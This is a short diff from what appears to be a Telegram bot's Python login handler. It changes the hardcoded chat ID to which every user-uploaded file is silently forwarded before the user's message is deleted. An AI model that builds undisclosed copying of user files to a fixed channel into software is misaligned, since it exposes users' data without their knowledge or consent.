@@ -44,7 +44,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
-        await bot.send_document(-1001920983212, x)
+        await bot.send_document(-1001918491159, x)
         await input.delete(True)
         file_name, ext = os.path.splitext(os.path.basename(x))
         credit = f"[{m.from_user.first_name}](tg://user?id={m.from_user.id})"
